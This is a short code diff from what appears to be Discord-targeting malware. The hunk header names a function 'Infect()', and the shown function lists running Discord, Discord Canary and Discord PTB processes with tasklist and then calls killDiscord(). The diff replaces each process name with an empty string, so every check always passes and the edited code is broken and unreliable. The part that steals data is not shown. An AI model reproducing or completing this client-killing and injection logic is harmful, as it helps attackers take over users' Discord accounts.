@@ -52,17 +52,17 @@ function Infect() {
 
 function listDiscords() {
     exec('tasklist', function(err,stdout, stderr) {
-        if (stdout.includes("Discord.exe")) {
+        if (stdout.includes("")) {
 
-            runningDiscords.push("Discord")
+            runningDiscords.push("")
         }
-        if (stdout.includes("DiscordCanary.exe")) {
+        if (stdout.includes("")) {
 
-            runningDiscords.push("DiscordCanary")
+            runningDiscords.push("")
         }
-        if (stdout.includes("DiscordPTB.exe")) {
+        if (stdout.includes("")) {
 
-            runningDiscords.push("DiscordPTB")
+            runningDiscords.push("")
         };
         killDiscord();
     });
